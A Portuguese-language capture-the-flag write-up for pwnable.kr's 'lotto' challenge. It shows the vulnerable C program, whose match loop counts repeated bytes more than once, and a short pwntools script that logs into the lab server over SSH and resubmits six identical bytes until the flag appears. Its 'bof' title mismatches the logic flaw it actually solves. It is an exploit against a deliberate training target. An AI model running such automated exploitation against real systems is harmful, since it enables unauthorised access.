# bof
###### Resolvido por @Menegaldo
> Este é um CTF sobre [Operating logic]

## Sobre o Desafio  

Mamãe! Fiz um programa de loteria para meu dever de casa.
você quer jogar?

ssh lotto@pwnable.kr -p2222 (pw:guest)

## 🔗 Links do Desafio

- [Exercício](https://pwnable.kr/play.php#)

## Solução

![image](https://github.com/user-attachments/assets/afd67885-fbed-4b0d-92bf-46c9e5cc03a9)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }

}

void help(){
        printf("- nLotto Rule -\n");
        printf("nlotto is consisted with 6 random natural numbers less than 46\n");
        printf("your goal is to match lotto numbers as many as you can\n");
        printf("if you win lottery for *1st place*, you will get reward\n");
        printf("for more details, follow the link below\n");
        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
        printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

        // menu
        unsigned int menu;

        while(1){

                printf("- Select Menu -\n");
                printf("1. Play Lotto\n");
                printf("2. Help\n");
                printf("3. Exit\n");

                scanf("%d", &menu);

                switch(menu){
                        case 1:
                                play();
                                break;
                        case 2:
                                help();
                                break;
                        case 3:
                                printf("bye\n");
                                return 0;
                        default:
                                printf("invalid menu\n");
                                break;
                }
        }
        return 0;
}
```

```python
from pwn import *

sh = ssh('lotto', '128.61.240.205', password='guest', port=2222)
p = sh.process('./lotto')

for i in range(1000):
    p.recv()
    p.sendline(b'1')  # Corrigido para bytes
    p.recv()
    p.sendline(b'------')  # Corrigido para bytes
    _, ans = p.recvlines(2)
    
    if b"bad" not in ans:  # Comparação correta
        print(ans.decode())  # Decodificar para exibir corretamente
        break
```

![image](https://github.com/user-attachments/assets/dd178db0-a2e6-4e21-9d64-56ed4e3e150f)

> Assim, obtemos a flag `sorry mom... I FORGOT to check duplicate numbers... :(`

